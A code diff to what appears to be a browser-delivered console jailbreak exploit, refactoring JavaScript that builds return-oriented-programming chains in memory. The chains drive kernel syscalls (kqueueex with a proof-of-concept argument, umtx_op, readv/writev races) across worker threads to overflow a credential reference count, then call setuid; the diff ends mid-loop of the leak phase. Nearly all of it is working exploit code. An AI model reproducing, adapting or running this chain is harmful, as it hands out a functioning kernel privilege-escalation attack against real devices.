@@ -197,10 +197,25 @@ async function start_p2jb() {
         }
 
         function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder) {
+            const rop_pop_rax = ROP.pop_rax;
+            const rop_pop_rdi = ROP.pop_rdi;
+            const rop_pop_rsi = ROP.pop_rsi;
+            const rop_pop_rdx = ROP.pop_rdx;
+            const rop_pop_rcx = ROP.pop_rcx;
+            const rop_pop_r8 = ROP.pop_r8;
+            const rop_pop_rsp = ROP.pop_rsp;
+            const rop_ret = ROP.ret;
+            const rop_mov_qword = ROP.mov_qword_rdi_rax;
+
+            const sys_kqueueex = SYSCALL.kqueueex;
+            const sys_read = SYSCALL.read;
+            const wrapper = syscall_wrapper;
+
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
             const STACK_SIZE = 0x4000 + (unroll * 31 + remainder * 6 + 0x200) * 8;
             const buf = malloc(STACK_SIZE);
+
             for (let k = 0n; k < 0x4000n; k += 8n) write64(buf + k, 0n);
             const entry = buf + 0x4000n;
 
@@ -209,83 +224,93 @@ async function start_p2jb() {
             write64(mask + 0x8n, 0n);
 
             let idx = 0;
-            const emit = (v) => { write64(entry + BigInt(idx * 8), v); idx++; };
+            let current_ptr = entry;
+
+            const emit = (v) => {
+                write64(current_ptr, v);
+                current_ptr += 8n; // Fast 64-bit hardware addition
+                idx++;
+            };
+
             const at = (i) => entry + BigInt(i * 8);
 
-            emit(ROP.ret);
-            emit(ROP.ret);
+            emit(rop_ret);
+            emit(rop_ret);
 
-            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
-            emit(ROP.pop_rdi); emit(3n);
-            emit(ROP.pop_rsi); emit(1n);
-            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
-            emit(ROP.pop_rcx); emit(0x10n);
-            emit(ROP.pop_r8); emit(mask);
-            emit(syscall_wrapper);
-            emit(ROP.ret);
+            emit(rop_pop_rax); emit(SYSCALL.cpuset_setaffinity);
+            emit(rop_pop_rdi); emit(3n);
+            emit(rop_pop_rsi); emit(1n);
+            emit(rop_pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
+            emit(rop_pop_rcx); emit(0x10n);
+            emit(rop_pop_r8); emit(mask);
+            emit(wrapper);
+            emit(rop_ret);
             const LOOP_START = idx;
 
             const readBase = idx;
-            emit(ROP.pop_rax); emit(SYSCALL.read);
-            emit(ROP.pop_rdi); emit(BigInt(pipe_rfd));
-            emit(ROP.pop_rsi); emit(dummybuf);
-            emit(ROP.pop_rdx); emit(1n);
-            emit(syscall_wrapper);
-            emit(ROP.ret);
+            emit(rop_pop_rax); emit(sys_read);
+            emit(rop_pop_rdi); emit(BigInt(pipe_rfd));
+            emit(rop_pop_rsi); emit(dummybuf);
+            emit(rop_pop_rdx); emit(1n);
+            emit(wrapper);
+            emit(rop_ret);
 
-            const kqBase = [];
+            const kqBase = new Array(unroll);
             for (let k = 0; k < unroll; k++) {
-                kqBase.push(idx);
-                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
-                emit(ROP.pop_rdi); emit(POC_ARG);
-                emit(syscall_wrapper);
-                emit(ROP.ret);
+                kqBase[k] = idx;
+                emit(rop_pop_rax); emit(sys_kqueueex);
+                emit(rop_pop_rdi); emit(POC_ARG);
+                emit(wrapper);
+                emit(rop_ret); // Preserved for hardware stack alignment and symmetry
             }
 
-            const repairSlot = (slotIdx, value) => {
-                emit(ROP.pop_rdi); emit(at(slotIdx));
-                emit(ROP.pop_rax); emit(value);
-                emit(ROP.mov_qword_rdi_rax);
-            };
-            repairSlot(readBase + 0, ROP.pop_rax);
-            repairSlot(readBase + 1, SYSCALL.read);
-            repairSlot(readBase + 2, ROP.pop_rdi);
-            repairSlot(readBase + 3, BigInt(pipe_rfd));
-            repairSlot(readBase + 4, ROP.pop_rsi);
-            repairSlot(readBase + 5, dummybuf);
-            repairSlot(readBase + 6, ROP.pop_rdx);
-            repairSlot(readBase + 7, 1n);
-            repairSlot(readBase + 8, syscall_wrapper);
+            // HIGH-PERFORMANCE REPAIR PATH (Replaces closure repairSlot overhead)
+            let repair_target = entry + BigInt(readBase * 8);
+
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, repair_target); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rax); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, repair_target + 8n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, sys_read); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, repair_target + 16n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rdi); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, repair_target + 24n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, BigInt(pipe_rfd)); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, repair_target + 32n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rsi); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, repair_target + 40n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, dummybuf); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, repair_target + 48n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rdx); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, repair_target + 56n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, 1n); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, repair_target + 64n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, wrapper); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+
+            // Direct multi-write sequence over loop iterations
             for (let k = 0; k < unroll; k++) {
-                const b = kqBase[k];
-                repairSlot(b + 0, ROP.pop_rax);
-                repairSlot(b + 1, SYSCALL.kqueueex);
-                repairSlot(b + 2, ROP.pop_rdi);
-                repairSlot(b + 3, POC_ARG);
-                repairSlot(b + 4, syscall_wrapper);
+                const b_offset = entry + BigInt(kqBase[k] * 8);
+
+                write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, b_offset); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rax); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n;
+                write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, b_offset + 8n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, sys_kqueueex); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n;
+                write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, b_offset + 16n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rdi); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n;
+                write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, b_offset + 24n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, POC_ARG); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n;
+                write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, b_offset + 32n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, wrapper); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n;
+
+                idx += 25;
             }
 
-            emit(ROP.pop_rax); emit(1n);
-            emit(ROP.pop_rdi); emit(finished_addr);
-            emit(ROP.mov_qword_rdi_rax);
+            emit(rop_pop_rax); emit(1n);
+            emit(rop_pop_rdi); emit(finished_addr);
+            emit(rop_mov_qword);
 
-            emit(ROP.pop_rsp);
+            emit(rop_pop_rsp);
             const PIVOT = idx; emit(at(LOOP_START));
 
-            if (idx % 2 !== 0) emit(ROP.ret);
+            if (idx % 2 !== 0) emit(rop_ret);
             const EXIT = idx;
             for (let k = 0; k < remainder; k++) {
-                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
-                emit(ROP.pop_rdi); emit(POC_ARG);
-                emit(syscall_wrapper);
-                emit(ROP.ret);
+                emit(rop_pop_rax); emit(sys_kqueueex);
+                emit(rop_pop_rdi); emit(POC_ARG);
+                emit(wrapper);
+                emit(rop_ret);
             }
-            emit(ROP.pop_rax); emit(EXIT_MARK);
-            emit(ROP.pop_rdi); emit(finished_addr);
-            emit(ROP.mov_qword_rdi_rax);
-            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
-            emit(ROP.pop_rdi); emit(0n);
-            emit(syscall_wrapper);
+            emit(rop_pop_rax); emit(EXIT_MARK);
+            emit(rop_pop_rdi); emit(finished_addr);
+            emit(rop_mov_qword);
+            emit(rop_pop_rax); emit(SYSCALL.thr_exit);
+            emit(rop_pop_rdi); emit(0n);
+            emit(wrapper);
 
             return { entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
         }
@@ -330,11 +355,20 @@ async function start_p2jb() {
             const cmd_addr = raw + align;
             const finished_base = cmd_addr + 8n;
             const awake_base = finished_base + BigInt(n * 8);
+            const finished_addrs = new Array(n);
+            const awake_addrs = new Array(n);
 
             write64(cmd_addr, 0n);
             for (let i = 0; i < n; i++) {
-                write64(finished_base + BigInt(i * 8), 0n);
-                write64(awake_base + BigInt(i * 8), 0n);
+                const offset = BigInt(i * 8);
+                const f_addr = finished_base + offset;
+                const a_addr = awake_base + offset;
+
+                finished_addrs[i] = f_addr;
+                awake_addrs[i] = a_addr;
+
+                write64(f_addr, 0n);
+                write64(a_addr, 0n);
             }
 
             const ws = {
@@ -347,13 +381,15 @@ async function start_p2jb() {
                 wait_val_slots: new Array(n).fill(0n),
                 pivot_slots: new Array(n).fill(0n),
                 exit_addrs: new Array(n).fill(0n),
+
                 signal() {
                     const next = this.gen + 1n;
                     this.gen = next;
 
+                    // Uses fast cached lookups instead of multiplying in the loop
                     for (let i = 0; i < n; i++) {
-                        write64(this.finished + BigInt(i * 8), 0n);
-                        write64(this.awake + BigInt(i * 8), 0n);
+                        write64(finished_addrs[i], 0n);
+                        write64(awake_addrs[i], 0n);
                     }
 
                     for (let i = 0; i < n; i++) {
@@ -364,40 +400,48 @@ async function start_p2jb() {
 
                     const deadline = Date.now() + 5000;
                     while (true) {
-                        syscall(SYSCALL.umtx_op, this.cmd, UMTX_OP_WAKE,
-                            0x7FFFFFFFn, 0n, 0n);
+                        syscall(SYSCALL.umtx_op, this.cmd, UMTX_OP_WAKE, 0x7FFFFFFFn, 0n, 0n);
+
                         let all_awake = true, stuck = -1;
                         for (let i = 0; i < n; i++) {
-                            if (read64(this.awake + BigInt(i * 8)) === 0n) {
-                                all_awake = false; stuck = i; break;
+                            if (read64(awake_addrs[i]) === 0n) {
+                                all_awake = false;
+                                stuck = i;
+                                break;
                             }
                         }
+
                         if (all_awake) break;
-                        if (Date.now() > deadline)
+                        if (Date.now() > deadline) {
                             fail("worker_sync.signal: WAKE timeout - worker " +
                                 stuck + "/" + n + " never reached WAIT exit");
+                        }
                         syscall(SYSCALL.sched_yield);
                     }
                 },
-                wait(timeout_ms) {
 
+                wait(timeout_ms) {
                     const deadline = Date.now() + (timeout_ms || 15000);
                     while (true) {
                         let done = true, stuck = -1;
                         for (let i = 0; i < n; i++) {
-                            if (read64(this.finished + BigInt(i * 8)) === 0n) {
-                                done = false; stuck = i; break;
+                            if (read64(finished_addrs[i]) === 0n) {
+                                done = false;
+                                stuck = i;
+                                break;
                             }
                         }
+
                         if (done) return;
-                        if (Date.now() > deadline)
+                        if (Date.now() > deadline) {
                             fail("worker_sync.wait: timeout - worker " + stuck +
                                 "/" + n + " stalled (no response in 15s)");
+                        }
                         syscall(SYSCALL.sched_yield);
                     }
                 },
-                terminate() {
 
+                terminate() {
                     for (let i = 0; i < n; i++) {
                         write64(this.pivot_slots[i], this.exit_addrs[i]);
                     }
@@ -409,6 +453,18 @@ async function start_p2jb() {
         }
 
         function build_worker_chain(ws, wid, fd, iov_ptr, sysnum, cpu_mask_addr, rt_params_addr) {
+            const rop_pop_rax = ROP.pop_rax;
+            const rop_pop_rdi = ROP.pop_rdi;
+            const rop_pop_rsi = ROP.pop_rsi;
+            const rop_pop_rdx = ROP.pop_rdx;
+            const rop_pop_rcx = ROP.pop_rcx;
+            const rop_pop_r8 = ROP.pop_r8;
+            const rop_pop_rsp = ROP.pop_rsp;
+            const rop_ret = ROP.ret;
+            const rop_mov_qword = ROP.mov_qword_rdi_rax;
+
+            const wrapper = syscall_wrapper;
+
             const STACK_SIZE = 0x10000;
             const buf = malloc(STACK_SIZE);
             for (let k = 0n; k < 0x4000n; k += 8n) write64(buf + k, 0n);
@@ -420,100 +476,107 @@ async function start_p2jb() {
             const count_arg = sysnum === SYSCALL.recvmsg ? 0n : UIO_IOV_COUNT;
 
             let idx = 0;
-            const emit = (v) => { write64(entry + BigInt(idx * 8), v); idx++; };
+            let current_ptr = entry;
+
+            const emit = (v) => {
+                write64(current_ptr, v);
+                current_ptr += 8n;
+                idx++;
+            };
+
             const at = (i) => entry + BigInt(i * 8);
 
-            emit(ROP.ret);
-            emit(ROP.ret);
+            emit(rop_ret);
+            emit(rop_ret);
 
-            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
-            emit(ROP.pop_rdi); emit(3n);
-            emit(ROP.pop_rsi); emit(1n);
-            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
-            emit(ROP.pop_rcx); emit(0x10n);
-            emit(ROP.pop_r8); emit(cpu_mask_addr);
-            emit(syscall_wrapper);
-            emit(ROP.ret);
+            emit(rop_pop_rax); emit(SYSCALL.cpuset_setaffinity);
+            emit(rop_pop_rdi); emit(3n);
+            emit(rop_pop_rsi); emit(1n);
+            emit(rop_pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
+            emit(rop_pop_rcx); emit(0x10n);
+            emit(rop_pop_r8); emit(cpu_mask_addr);
+            emit(wrapper);
+            emit(rop_ret);
 
-            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
-            emit(ROP.pop_rdi); emit(1n);
-            emit(ROP.pop_rsi); emit(0n);
-            emit(ROP.pop_rdx); emit(rt_params_addr);
-            emit(syscall_wrapper);
-            emit(ROP.ret);
+            emit(rop_pop_rax); emit(SYSCALL.rtprio_thread);
+            emit(rop_pop_rdi); emit(1n);
+            emit(rop_pop_rsi); emit(0n);
+            emit(rop_pop_rdx); emit(rt_params_addr);
+            emit(wrapper);
+            emit(rop_ret);
             const LOOP_START = idx;
 
             const waitBase = idx;
-            emit(ROP.pop_rax); emit(SYSCALL.umtx_op);
-            emit(ROP.pop_rdi); emit(cmd_addr);
-            emit(ROP.pop_rsi); emit(UMTX_OP_WAIT);
-            emit(ROP.pop_rdx); emit(0n);
-            emit(ROP.pop_rcx); emit(0n);
-            emit(ROP.pop_r8); emit(0n);
-            emit(syscall_wrapper);
-            emit(ROP.ret);
+            emit(rop_pop_rax); emit(SYSCALL.umtx_op);
+            emit(rop_pop_rdi); emit(cmd_addr);
+            emit(rop_pop_rsi); emit(UMTX_OP_WAIT);
+            emit(rop_pop_rdx); emit(0n);
+            emit(rop_pop_rcx); emit(0n);
+            emit(rop_pop_r8); emit(0n);
+            emit(wrapper);
+            emit(rop_ret);
             const wait_val_slot = at(waitBase + 7);
 
             const awakeBase = idx;
-            emit(ROP.pop_rax); emit(1n);
-            emit(ROP.pop_rdi); emit(awake_addr);
-            emit(ROP.mov_qword_rdi_rax);
-            emit(ROP.ret);
+            emit(rop_pop_rax); emit(1n);
+            emit(rop_pop_rdi); emit(awake_addr);
+            emit(rop_mov_qword);
+            emit(rop_ret);
 
             const workBase = idx;
-            emit(ROP.pop_rax); emit(sysnum);
-            emit(ROP.pop_rdi); emit(BigInt(fd));
-            emit(ROP.pop_rsi); emit(iov_ptr);
-            emit(ROP.pop_rdx); emit(count_arg);
-            emit(syscall_wrapper);
-            emit(ROP.ret);
+            emit(rop_pop_rax); emit(sysnum);
+            emit(rop_pop_rdi); emit(BigInt(fd));
+            emit(rop_pop_rsi); emit(iov_ptr);
+            emit(rop_pop_rdx); emit(count_arg);
+            emit(wrapper);
+            emit(rop_ret);
 
-            const repairSlot = (slotIdx, value) => {
-                emit(ROP.pop_rdi); emit(at(slotIdx));
-                emit(ROP.pop_rax); emit(value);
-                emit(ROP.mov_qword_rdi_rax);
-            };
-            repairSlot(waitBase + 0, ROP.pop_rax);
-            repairSlot(waitBase + 1, SYSCALL.umtx_op);
-            repairSlot(waitBase + 2, ROP.pop_rdi);
-            repairSlot(waitBase + 3, cmd_addr);
-            repairSlot(waitBase + 4, ROP.pop_rsi);
-            repairSlot(waitBase + 5, UMTX_OP_WAIT);
-            repairSlot(waitBase + 6, ROP.pop_rdx);
+            let wait_target = entry + BigInt(waitBase * 8);
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, wait_target); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rax); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, wait_target + 8n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, SYSCALL.umtx_op); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, wait_target + 16n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rdi); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, wait_target + 24n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, cmd_addr); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, wait_target + 32n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rsi); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, wait_target + 40n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, UMTX_OP_WAIT); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, wait_target + 48n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rdx); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
 
-            repairSlot(waitBase + 8, ROP.pop_rcx);
-            repairSlot(waitBase + 9, 0n);
-            repairSlot(waitBase + 10, ROP.pop_r8);
-            repairSlot(waitBase + 11, 0n);
-            repairSlot(waitBase + 12, syscall_wrapper);
-            repairSlot(awakeBase + 0, ROP.pop_rax);
-            repairSlot(awakeBase + 1, 1n);
-            repairSlot(awakeBase + 2, ROP.pop_rdi);
-            repairSlot(awakeBase + 3, awake_addr);
-            repairSlot(awakeBase + 4, ROP.mov_qword_rdi_rax);
-            repairSlot(workBase + 0, ROP.pop_rax);
-            repairSlot(workBase + 1, sysnum);
-            repairSlot(workBase + 2, ROP.pop_rdi);
-            repairSlot(workBase + 3, BigInt(fd));
-            repairSlot(workBase + 4, ROP.pop_rsi);
-            repairSlot(workBase + 5, iov_ptr);
-            repairSlot(workBase + 6, ROP.pop_rdx);
-            repairSlot(workBase + 7, count_arg);
-            repairSlot(workBase + 8, syscall_wrapper);
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, wait_target + 64n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rcx); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, wait_target + 72n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, 0n); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, wait_target + 80n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_r8); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, wait_target + 88n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, 0n); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, wait_target + 96n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, wrapper); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
 
-            emit(ROP.pop_rax); emit(1n);
-            emit(ROP.pop_rdi); emit(finished_addr);
-            emit(ROP.mov_qword_rdi_rax);
+            let awake_target = entry + BigInt(awakeBase * 8);
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, awake_target); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rax); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, awake_target + 8n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, 1n); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, awake_target + 16n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rdi); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, awake_target + 24n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, awake_addr); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, awake_target + 32n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_mov_qword); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
 
-            emit(ROP.pop_rsp);
+            let work_target = entry + BigInt(workBase * 8);
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, work_target); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rax); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, work_target + 8n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, sysnum); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, work_target + 16n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rdi); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, work_target + 24n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, BigInt(fd)); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, work_target + 32n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rsi); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, work_target + 40n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, iov_ptr); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, work_target + 48n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, rop_pop_rdx); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, work_target + 56n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, count_arg); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+            write64(current_ptr, rop_pop_rdi); write64(current_ptr + 8n, work_target + 64n); write64(current_ptr + 16n, rop_pop_rax); write64(current_ptr + 24n, wrapper); write64(current_ptr + 32n, rop_mov_qword); current_ptr += 40n; idx += 5;
+
+            emit(rop_pop_rax); emit(1n);
+            emit(rop_pop_rdi); emit(finished_addr);
+            emit(rop_mov_qword);
+
+            emit(rop_pop_rsp);
             const pivotSlotIdx = idx;
             emit(at(LOOP_START));
 
-            if (idx % 2 !== 0) emit(ROP.ret);
+            if (idx % 2 !== 0) emit(rop_ret);
             const EXIT_START = idx;
-            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
-            emit(ROP.pop_rdi); emit(0n);
-            emit(syscall_wrapper);
+            emit(rop_pop_rax); emit(SYSCALL.thr_exit);
+            emit(rop_pop_rdi); emit(0n);
+            emit(wrapper);
 
             return {
                 entry,
@@ -643,35 +706,33 @@ async function start_p2jb() {
             S.uio_read_ws = make_worker_sync(UIO_THREAD_NUM);
             S.uio_write_ws = make_worker_sync(UIO_THREAD_NUM);
 
+            const deploy_worker = (sync_obj, index, fd, iov_ptr, sysnum) => {
+                const ch = build_worker_chain(
+                    sync_obj,
+                    index,
+                    fd,
+                    iov_ptr,
+                    sysnum,
+                    S.cpu_mask,
+                    S.rt_params
+                );
+
+                sync_obj.wait_val_slots[index] = ch.wait_val_slot;
+                sync_obj.pivot_slots[index] = ch.pivotAddr;
+                sync_obj.exit_addrs[index] = ch.exitAddr;
+                spawn_leak_worker(ch.entry);
+            };
+
             for (let i = 0; i < IOV_THREAD_NUM; i++) {
-                const ch = build_worker_chain(
-                    S.iov_ws, i, S.iov_sock_a, S.recvmsg_hdr, SYSCALL.recvmsg,
-                    S.cpu_mask, S.rt_params,
-                );
-                S.iov_ws.wait_val_slots[i] = ch.wait_val_slot;
-                S.iov_ws.pivot_slots[i] = ch.pivotAddr;
-                S.iov_ws.exit_addrs[i] = ch.exitAddr;
-                spawn_leak_worker(ch.entry);
+                deploy_worker(S.iov_ws, i, S.iov_sock_a, S.recvmsg_hdr, SYSCALL.recvmsg);
             }
+
             for (let i = 0; i < UIO_THREAD_NUM; i++) {
-                const ch = build_worker_chain(
-                    S.uio_read_ws, i, S.uio_sock_b, S.uio_iov_read, SYSCALL.writev,
-                    S.cpu_mask, S.rt_params,
-                );
-                S.uio_read_ws.wait_val_slots[i] = ch.wait_val_slot;
-                S.uio_read_ws.pivot_slots[i] = ch.pivotAddr;
-                S.uio_read_ws.exit_addrs[i] = ch.exitAddr;
-                spawn_leak_worker(ch.entry);
+                deploy_worker(S.uio_read_ws, i, S.uio_sock_b, S.uio_iov_read, SYSCALL.writev);
             }
+
             for (let i = 0; i < UIO_THREAD_NUM; i++) {
-                const ch = build_worker_chain(
-                    S.uio_write_ws, i, S.uio_sock_a, S.uio_iov_write, SYSCALL.readv,
-                    S.cpu_mask, S.rt_params,
-                );
-                S.uio_write_ws.wait_val_slots[i] = ch.wait_val_slot;
-                S.uio_write_ws.pivot_slots[i] = ch.pivotAddr;
-                S.uio_write_ws.exit_addrs[i] = ch.exitAddr;
-                spawn_leak_worker(ch.entry);
+                deploy_worker(S.uio_write_ws, i, S.uio_sock_a, S.uio_iov_write, SYSCALL.readv);
             }
         }
 
@@ -817,28 +878,28 @@ async function start_p2jb() {
 
             syscall(SYSCALL.setuid, 1n);
 
-            await js_sleep(1000);
+            await js_sleep(3000);
 
             const TOTAL_SYSCALLS = 0x100000001n - BigInt(free_fds_num);
-
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
             const LEAK_UNROLL = 4096;
             const U = BigInt(LEAK_UNROLL);
-
             const NW = LEAK_CORES.length;
             const FEED_CHUNK = 4096;
-
             const chunkbuf = malloc(FEED_CHUNK);
-
             const base_share = TOTAL_SYSCALLS / BigInt(NW);
             const extra0 = TOTAL_SYSCALLS - base_share * BigInt(NW);
             const lws = [];
+            let total_batches = 0n;
+
             for (let w = 0; w < NW; w++) {
                 const target_w = base_share + (w === 0 ? extra0 : 0n);
                 const bplus1_w = target_w / U;
                 const normal_w = bplus1_w - 1n;
                 const remainder_w = target_w - bplus1_w * U;
+                total_batches += normal_w;
+
                 const [pr, pw] = create_pipe();
                 const rfd = Number(pr), wfd = Number(pw);
 
@@ -855,94 +916,149 @@ async function start_p2jb() {
                 });
             }
 
-            let op_percent_cntr = 0;
-            let refresh_cntr = 0;
-            let refresh_limit = 0;
-            let loop_cntr = 0;
+            const leak_start = Date.now();
+            let last_ui_update = 0;
+
+            document.getElementById("progressBar").style.transform = "scaleX(0)";
+            document.getElementById("progressLabel").textContent =
+                "cr_ref overflow... 0% (~" +
+                eta_minutes + "m remaining)";
+
             let all_fed = false;
+
             while (!all_fed) {
                 all_fed = true;
+
                 for (const lw of lws) {
                     if (lw.queued < lw.normal) {
                         all_fed = false;
-                        let want = lw.normal - lw.queued;
